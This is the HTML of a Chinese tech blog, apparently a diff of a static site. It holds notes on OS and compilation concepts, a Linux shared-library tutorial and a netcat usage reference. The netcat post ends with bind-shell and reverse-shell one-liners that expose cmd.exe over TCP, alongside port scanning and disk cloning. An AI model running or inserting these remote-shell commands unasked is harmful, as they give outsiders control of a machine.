+<p>command E：复位信息</p>
+<p>command F：回复信息</p>
+<p>command shift R：回复全部信息</p>
+<p>command shift B：弹出发件人</p>
+<p>command shift T：转换信息，丰富文字或纯文本</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/13/code-self-discipline/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/13/code-self-discipline/" itemprop="url">
+                  程序员的自我修养 读书笔记
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-13T00:00:00+08:00">
+                2015-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="驱动程序"><a href="#驱动程序" class="headerlink" title="驱动程序"></a>驱动程序</h3><p>驱动程序可以看作是操作系统的一部分，它往往跟操作系统内核一起运行在特权级，但它又与操作系统内核之间有一定的独立性，使得驱动程序有比较好的灵活性。</p>
+<h3 id="系统抽象"><a href="#系统抽象" class="headerlink" title="系统抽象"></a>系统抽象</h3><p>UNIX中，硬件设备的访问形式跟访问普通的文件形式一样</p>
+<p>Windows系统中，图形硬件被抽象成了GDI，声音和多媒体设备被抽象成了DirectX对象；磁盘被抽象成了普通文件系统，等等</p>
+<h3 id="多任务系统-Multi-tasking"><a href="#多任务系统-Multi-tasking" class="headerlink" title="多任务系统(Multi-tasking)"></a>多任务系统(Multi-tasking)</h3><p>操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以进程（Process）的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，使得进程之间的地址空间相互隔离。CPU由操作系统统一进行分配，每个进程根据进程优先级的高低都有机会得到CPU，但是，如果运行时间超出了一定的时间，操作系统会暂停该进程，将CPU资源分配给其他等待运行的进程。这种CPU的分配方式即所谓的抢占式（Preemptive），操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。如果操作系统分配给每个进程的时间都很短，即CPU在多个进程间快速地切换，从而造成了很多进程都在同时运行的假象。目前几乎所有现代的操作系统都是采用这种方式，比如我们熟悉的UNIX、Linux、Windows NT，以及Mac OS X等流行的操作系统。</p>
+<h3 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h3><p>分页的基本方法是把地址空间人为地等分成固定大小的页，每一页的大小由硬件决定，或硬件支持多种大小的页，由操作系统选择决定页的大小。</p>
+<h3 id="线程等待"><a href="#线程等待" class="headerlink" title="线程等待"></a>线程等待</h3><p>一般把频繁等待的线程称之为IO密集型线程（IO Bound Thread），而把很少等待的线程称为CPU密集型线程（CPU Bound Thread）。IO密集型线程总是比CPU密集型线程容易得到优先级的提升。</p>
+<h3 id="关于线程优先级"><a href="#关于线程优先级" class="headerlink" title="关于线程优先级"></a>关于线程优先级</h3><p>优先级调度的环境下，线程的优先级改变一般有三种方式。</p>
+<ul>
+<li>用户指定优先级。</li>
+<li>根据进入等待状态的频繁程度提升或降低优先级。</li>
+<li>长时间得不到执行而被提升优先级。</li>
+</ul>
+<h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><ul>
+<li>预处理（PreProcess）</li>
+<li>编译（Compilation）</li>
+<li>汇编（Assembly）</li>
+<li>链接（Linking）</li>
+</ul>
+<p>编译阶段</p>
+<p><img src="https://cloud.githubusercontent.com/assets/1845119/11172792/d4a0bbdc-8c47-11e5-923c-8a0469eff693.png" alt="gcc complie stage"></p>
+<p>编译过程</p>
+<p><img src="https://cloud.githubusercontent.com/assets/1845119/11265132/b654c74c-8ed4-11e5-9415-13ff4b7f6ae6.png" alt="gcc complie progress"></p>
+<h3 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h3><p>链接过程主要包括了地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定位（Relocation）等这些步骤。</p>
+<p><img src="https://cloud.githubusercontent.com/assets/1845119/11358386/2553d6da-92ac-11e5-8b8b-4be98108a7e1.png" alt="gcc link stage"></p>
+<h3 id="linux批量处理进程"><a href="#linux批量处理进程" class="headerlink" title="linux批量处理进程"></a>linux批量处理进程</h3><p><code>ps uax | grep java | awk &#39;{print $2}&#39; | xargs kill -9</code></p>
+<h3 id="关于目标文件"><a href="#关于目标文件" class="headerlink" title="关于目标文件"></a>关于目标文件</h3><p>PC平台流行的可执行文件格式（Executable）主要是Windows下的PE（Portable Executable）和Linux的ELF（Executable Linkable Format），它们都是COFF（Common file format）格式的变种。<strong>目标文件</strong>就是源代码编译后但未进行链接的那些中间文件（Windows的.obj和Linux下的.o），它跟可执行文件的内容与结构很相似，所以一般跟可执行文件格式一起采用一种格式存储。从广义上看，目标文件与可执行文件的格式其实几乎是一样的，所以我们可以广义地将目标文件与可执行文件看成是一种类型的文件，在Windows下，我们可以统称它…</p>
+<p><img src="https://cloud.githubusercontent.com/assets/1845119/11456727/391d3998-96cd-11e5-87e3-1f0a1b261811.png" alt="image"></p>
+<h3 id="CPP-namespace"><a href="#CPP-namespace" class="headerlink" title="CPP namespace"></a>CPP namespace</h3>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/12/cpp-d-lib/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/12/cpp-d-lib/" itemprop="url">
+                  Linux动态库相关知识整理
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-12T00:00:00+08:00">
+                2015-11-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>动态库和静态库在C/C++开发中很常见，相比静态库直接被编译到可执行程序， 动态库运行时加载使得可执行程序的体积更小，更新动态库可以不用重新编译可执 行程序等诸多好处。作者是一个Linux后台开发，这些知识经常用到，所以 整理了一下这方面的知识。静态库相对简单，本文只关心Linux平台下的动态库。</p>
+<h2 id="创建动态库"><a href="#创建动态库" class="headerlink" title="创建动态库"></a>创建动态库</h2><p>这里我把一个短小却很有用的哈希函数编译成动态库做为示例，ELFhash用于对字符串做哈希，返回一个无符号整数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">//elfhash.h</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">unsigned long  ELFhash(const char* key);</div><div class="line"></div><div class="line">//elfhash.c</div><div class="line">#include &quot;elfhash.h&quot;</div><div class="line">unsigned long ELFhash(const char* key)  </div><div class="line">&#123;</div><div class="line">  unsigned long h = 0, g;</div><div class="line">  while( *key ) &#123;</div><div class="line">    h = ( h &lt;&lt; 4 ) + *key++;</div><div class="line">    if ( (g = h &amp; 0xF0000000) != 0 )</div><div class="line">       h ^= g &gt;&gt; 24;</div><div class="line">    h &amp;= ~g;</div><div class="line">&#125;</div><div class="line">  return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来使用gcc编译以上代码，并用ld将编译的目标文件链接成动态库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -fPIC -c -Wall elfhash.c  </div><div class="line">ld  -shared elfhash.o -o libelfhash.so</div></pre></td></tr></table></figure>
+<p>其中-fPIC意思是生成位置无关的代码(Position Independent Code)，适用于动态库，在多个进程中共享动态库的同一份代码。ld的-shared选项告诉链接器创建的是动态库。gcc也可以间接调用ld生成动态库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fPIC -shared -Wall -o libelfhash.so elfhash.c</div></pre></td></tr></table></figure>
+<h2 id="使用动态库"><a href="#使用动态库" class="headerlink" title="使用动态库"></a>使用动态库</h2><p>动态库的使用方法有两种一种是隐式使用，第二种是显式使用。隐式使用的方法很简单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &quot;elfhash.h&quot;</div><div class="line">int main()  </div><div class="line">&#123;</div><div class="line">    printf(&quot;%ld\n&quot;, ElfHash(&quot;key-for-test&quot;));</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>显式使用动态库需要借助以下几个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">void *dlopen(const char *filename, int flag); //flag可以是RTLD_LAZY，执行共享库中的代码时解决未定义符号，RTLD_NOW则是dlopen返回前解决未定义符号。  </div><div class="line">char *dlerror(void); //当发生错误时，返回错误信息  </div><div class="line">void *dlsym(void *handle, const char *symbol); //获取符号  </div><div class="line">int dlclose(void *handle); //关闭</div></pre></td></tr></table></figure>
+<p>应用上面几个函数，调用ELFhash实现跟隐式调用一样的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#include &quot;elfhash.h&quot;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">int main() &#123;  </div><div class="line">    void *handle;</div><div class="line">    unsigned long (*hash)(const char*);</div><div class="line">    char *error;</div><div class="line">    handle = dlopen (&quot;./libelfhash.so&quot;, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">        fputs (dlerror(), stderr);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line">    hash = dlsym(handle, &quot;ElfHash&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">         fputs(error, stderr);</div><div class="line">         exit(1);</div><div class="line">    &#125;</div><div class="line">    printf (&quot;%ld\n&quot;, (*hash)(&quot;key-for-test&quot;));</div><div class="line">    dlclose(handle);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>至此了解以上的知识就可以创建和使用动态库了。 实际应用中我们可能还是会遇到一些问题。</p>
+<h2 id="动态库的加载"><a href="#动态库的加载" class="headerlink" title="动态库的加载"></a>动态库的加载</h2><p>动态库创建那一节，我演示如何隐式使用动态库，那么编译运行这段代码试一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gcc main.c -L./ -lelfhash  </div><div class="line">./a.out //执行可执行程序</div><div class="line">//以下是输出结果</div><div class="line">./a.out: error while loading shared libraries: libelfhash.so: cannot open shared object file: No such file or directory</div></pre></td></tr></table></figure>
+<p>结果运行时报错，可执行程序找不到动态库。 网上有一些说法是编译时设置-L选项，但在Linux上面证明是不行的（SunOS上可行），这个选项只能在编译链接时有效， 可以让你使用-l如上面的-lelfhash。使用readelf -d a.out可以看到可执行文件依赖的动态库信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x0000000000000001 (NEEDED)  Shared library: [libelfhash.so]</div></pre></td></tr></table></figure>
+<p>可以看到这里面并没有包含动态库的路径信息。查阅一下动态链接器的文档man ld-linux.so可以发现这样一句话(有的没有，版本问题)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">If a slash is found, then the dependency string is interpreted as a (relative or absolute) pathname, and the library is loaded using that pathname</div></pre></td></tr></table></figure>
+<p>这段话太长，我只截取一部分，大致就是说，当依赖中有/符号,那么会被解析成动态库加载的路径，隐式使用的例子换一种编译方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gcc main.c ./libelfhash.so  </div><div class="line">./a.out</div><div class="line">23621492 //输出正常</div></pre></td></tr></table></figure>
+<p>再用readelf -d a.out查看会发现，依赖信息中有了一个路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x0000000000000001 (NEEDED)  Shared library: [./libelfhash.so]</div></pre></td></tr></table></figure>
+<p>这种方法虽然解决了问题，但是依赖中的路径是硬编码，不是很灵活。 动态链接器是如何查找的动态库的需要进一步查阅文档。关于查找的顺序有点长，这里就不直接引用了，大致是这样：</p>
+<p>(仅ELF文件) 使用可执行文件中DT_RPATH区域设置的属性,如果DT_RUNPATH被设置，那么忽略DT_RPATH（在我的Linux对应的是RPATH和RUNPATH）。</p>
+<p>使用环境变量LD_LIBRARY_PATH，如果可执行文件中有set-user-id/set-group-id, 会被忽略。</p>
+<p>(仅ELF文件) 使用可执行文件中DT_RUNPATH区域设置的属性</p>
+<p>从/etc/ld.so.cache缓存文件中查找</p>
+<p>从默认路径/lib, /usr/lib文件目录中查找</p>
+<p>我们需要设置RPATH或者RUNPATH,可以这样做</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc main.c -Wl,-rpath,/home/xxx,--enable-new-dtags -L./  -lelfhash</div></pre></td></tr></table></figure>
+<p>这里的-Wl选项告诉链接器ld如果如何处理，接下来传递的-rpath(或者使用-R)告诉ld动态库的路径信息(注意-Wl,和后面选项之间不能有空格)。如果没有–enable-new-dtags那么只会设置RPATH，反之，RPATH和RUNPATH会同时被设置。使用readelf -d a.out查看结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0x000000000000000f (RPATH)  Library rpath: [/home/xxx]  </div><div class="line">0x000000000000001d (RUNPATH)  Library runpath: [/home/xxx]</div></pre></td></tr></table></figure>
+<p>如果使用环境变量LD_LIBRARY_PATH，那么一般这样用 export</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export LD_LIBRARY_PATH=/home/xxx;$LD_LIBRARY_PATH</div></pre></td></tr></table></figure>
+<p>RPATH和RUNPATH指定动态库的路径，用起来简单，但是也缺乏灵活性，LDLIBRARYPATH在临时测试的也是很有用的，但是在正式环境中，直接使用它也不是好的实践，因为环境变量跟用户的环境关系比较大。动态库不仅要考虑自己使用， 还有分发给别的用户使用的情况。</p>
+<p>更通用的方法是使用ldconfig，有几种方法，先在/etc/ld.so.conf.d/目录下创建一个文件，然后把你的动态库路径写进去。或者将你的动态库放到/lib,/lib64(64位),/usr/lib,/usr/lib64(64位)然后运行sudo ldconfig重建/etc/ld.so.cache文件。</p>
+<h2 id="动态库版本"><a href="#动态库版本" class="headerlink" title="动态库版本"></a>动态库版本</h2><p>通常在使用第三方给的动态库的时候，都是带有版本（文件命名），可以在/usr/lib64下看到很多这样的动态库。现在我重新编译动态库，这次加上版本信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fPIC -shared -Wall -Wl,-soname,libelfhash.so.0  -o libelfhash.so.0.0.0 elfhash.c</div></pre></td></tr></table></figure>
+<p>每个动态库都有一个名字，如这里的libelfhash.so.0.0.0，叫real name，命名规则跟简单,通常是libxxx.so.MAJOR.MINOR.VERSION(有的时候VERSION会被省略),如果动态库在接口上的兼容性，比如删除了接口或者修改了接口参数，MAJOR增加，如果接口兼容，只是做了更新或者bug修复那么MINOR和VERSION增加。也就是说MAJOR相同的库接口都是兼容的，反之不兼容，如果使用不兼容的动态库需要重新编译可执行程序。</p>
+<p>编译动态库时，通过给ld传递连接选项-soname可以指定一个soname, 如这里的libelfhash.so.0 只保留MAJOR,可执行程序运行加载动态库时，会加载这个指定名字的库。</p>
+<p>动态库还有一个名字是link name,编译可执行程序时，传个链接器ld的动态库名字，通常是没有版本号以.so结尾的文件名。 一般作法是对soname创建软链。</p>
+<p>按照这个规则来命名的动态库可以ldconfig识别，我们把libelfhash.so.0.0.0放到/usr/lib64文件夹中，执行以下指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$sudo ldconfig -v | grep libelfhash.so</div><div class="line">libelfhash.so.0 -&gt; libelfhash.so.0.0.0</div></pre></td></tr></table></figure>
+<p>可以发现ldconfig根据libelfhash.so.0.0.0的信息，创建了一个soname指向real name的软链，当动态库更新(MINOR,VERSION增加)，拷贝新库到相应的位置，再执行sudo ldconfig会自动更新软链指向最新的动态库，动态库更新就完成了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>OK，关于Linux动态库知识整理就到这里了，这些知识虽说都是些基础，少有涉及动态库内部的一些原理，但是却很常用。整理过程中我带着疑问去阅读了ld和ld-linux.so的文档，收获颇丰。同样，希望本文能帮你解释遇到的部分问题或疑惑。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/09/linux-nc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/09/linux-nc/" itemprop="url">
+                  linux nc命令
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-09T00:00:00+08:00">
+                2015-11-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>功能说明</strong>：功能强大的网络工具</p>
+<p><strong>语　法</strong>：nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]</p>
+<p><strong>参　数</strong>：<br> <code>-g</code>&lt;网关&gt; 设置路由器跃程通信网关，最丢哦可设置8个。</p>
+<p> <code>-G</code>&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</p>
+<p> <code>-h</code>  在线帮助。</p>
+<p> <code>-i</code>&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</p>
+<p> <code>-l</code>  使用监听模式，管控传入的资料。</p>
+<p> <code>-n</code>  直接使用IP地址，而不通过域名服务器。</p>
+<p> <code>-o</code>&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</p>
+<p> <code>-p</code>&lt;通信端口&gt; 设置本地主机使用的通信端口。</p>
+<p> <code>-r</code>  乱数指定本地与远端主机的通信端口。</p>
+<p> <code>-s</code>&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</p>
+<p> <code>-u</code>  使用UDP传输协议。</p>
+<p> <code>-v</code> 详细输出–用两个-v可得到更详细的内容</p>
+<p> <code>-w</code>&lt;超时秒数&gt; 设置等待连线的时间。</p>
+<p> <code>-z</code>  使用0输入/输出模式，只在扫描通信端口时使用。</p>
+<h2 id="nc使用示例"><a href="#nc使用示例" class="headerlink" title="nc使用示例"></a>nc使用示例</h2><ol>
+<li>端口扫描</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># nc -v -z 2 192.168.2.34 21-24</div></pre></td></tr></table></figure>
+<ol>
+<li>从192.168.2.33拷贝文件到192.168.2.34</li>
+</ol>
+<p>在192.168.2.34上： <code>nc -l 1234 &gt; test.txt</code></p>
+<p>在192.168.2.33上： <code>nc 192.168.2.34 &lt; test.txt</code></p>
+<ol>
+<li>简单聊天工具</li>
+</ol>
+<p>在192.168.2.34上： <code>nc -l 1234</code></p>
+<p>在192.168.2.33上： <code>nc 192.168.2.34 1234</code></p>
+<p>这样，双方就可以相互交流了。使用ctrl+C(或D）退出。</p>
+<ol>
+<li>用nc命令操作memcached</li>
+</ol>
+<p>1）存储数据：<code>printf&quot;set key 0 10 6rnresultrn&quot; |nc 192.168.2.34 11211</code></p>
+<p>2）获取数据：<code>printf&quot;get keyrn&quot; |nc 192.168.2.34 11211</code></p>
+<p>3）删除数据：<code>printf&quot;delete keyrn&quot; |nc 192.168.2.34 11211</code></p>
+<p>4）查看状态：<code>printf&quot;statsrn&quot; |nc 192.168.2.34 11211</code></p>
+<p>5）模拟top命令查看状态：<code>watch&quot;echo stats&quot; |nc 192.168.2.34 11211</code></p>
+<p>6）清空缓存：<code>printf&quot;flush_allrn&quot; |nc 192.168.2.34 11211</code> (小心操作，清空了缓存就没了）</p>
+<ol>
+<li><code>nc -p 1234 -w 5 host.example.com 80</code></li>
+</ol>
+<p>建立从本地1234端口到host.example.com的80端口连接，5秒超时</p>
+<p><code>nc -u host.example.com 53</code></p>
+<p>u为UDP连接</p>
+<ol>
+<li><code>echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80</code></li>
+</ol>
+<p>连接到主机并执行</p>
+<ol>
+<li><code>nc -v -z host.example.com 70-80</code></li>
+</ol>
+<p>扫描端口(70到80)，可指定范围。-v输出详细信息。</p>
+<ol>
+<li>远程拷贝文件</li>
+</ol>
+<p>从server1拷贝文件到server2上。需要先在server2上，用nc激活监听，</p>
+<p>server2上运行：</p>
+<p><code>root@ct2 tmp]# nc -lp 1234 &gt; install.log</code></p>
+<p>server1上运行：</p>
+<p><code>[root@ct1 ~]# ll install.log</code><br><code>-rw-r–r–  1 root root 39693 12月 20  2007 install.log</code><br><code>[root@ct1 ~]# nc -w 1 192.168.228.222 1234 &lt; install.log</code></p>
+<ol>
+<li>克隆硬盘或分区</li>
+</ol>
+<p>操作与上面的拷贝是雷同的，只需要由dd获得硬盘或分区的数据，然后传输即可。</p>
+<p>克隆硬盘或分区的操作，不应在已经mount的的系统上进行。所以，需要使用安装光盘引导后，进入拯救模式（或使用Knoppix工具光盘）启动系统后，在server2上进行类似的监听动作：</p>
+<p><code># nc -l -p 1234 | dd of=/dev/sda</code></p>
+<p>server1上执行传输，即可完成从server1克隆sda硬盘到server2的任务：</p>
+<p><code># dd if=/dev/sda | nc 192.168.228.222 1234</code></p>
+<p>※完成上述工作的前提，是需要落实光盘的拯救模式支持服务器上的网卡，并正确配置IP。</p>
+<ol>
+<li>保存Web页面</li>
+</ol>
+<p><code># while true; do nc -l -p 80 -q 1 &lt; somepage.html; done</code></p>
+<ol>
+<li>模拟HTTP Headers,获取网页源代码和返回头部信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[root@ct1 ~]# nc 80</div><div class="line">GET / HTTP/1.1</div><div class="line">Host: ispconfig.org</div><div class="line">Referrer: mypage.com</div><div class="line">User-Agent: my-browser</div><div class="line"> </div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Tue, 16 Dec 2008 07:23:24 GMT</div><div class="line">Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8</div><div class="line">Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/</div><div class="line">Expires: 0</div><div class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</div><div class="line">Pragma: no-cache</div><div class="line">Cache-Control: private, post-check=0, pre-check=0, max-age=0</div><div class="line">Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/</div><div class="line">Vary: Accept-Encoding</div><div class="line">Transfer-Encoding: chunked</div><div class="line">Content-Type: text/html</div><div class="line">[......]</div></pre></td></tr></table></figure>
+<p>在nc命令后，输入红色部分的内容，然后按两次回车，即可从对方获得HTTP Headers内容。</p>
+<ol>
+<li>传输目录<br>从server1拷贝nginx-0.6.34目录内容到server2上。需要先在server2上，用nc激活监听，server2上运行：</li>
+</ol>
+<p><code>[root@ct2 tmp]# nc -l 1234 |tar xzvf -</code><br>server1上运行：</p>
+<p><code>[root@ct1 ~]# ll -d nginx-0.6.34</code><br><code>drwxr-xr-x 8 1000 1000 4096 12-23 17:25 nginx-0.6.34</code><br><code>[root@ct1 ~]# tar czvf – nginx-0.6.34|nc 192.168.228.222 1234</code></p>
+<ol>
+<li>REMOTE主机绑定SHELL</li>
+</ol>
+<p>例子：</p>
+<p>格式：<code>nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</code><br>讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</p>
+<ol>
+<li>REMOTE主机绑定SHELL并反向连接<br>例子：</li>
+</ol>
+<p>格式：<code>nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</code><br>讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口<br>以上为最基本的几种用法（其实NC的用法还有很多，<br>当配合管道命令”|”与重定向命令”&lt;”、”&gt;”等等命令功能更强大……）。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
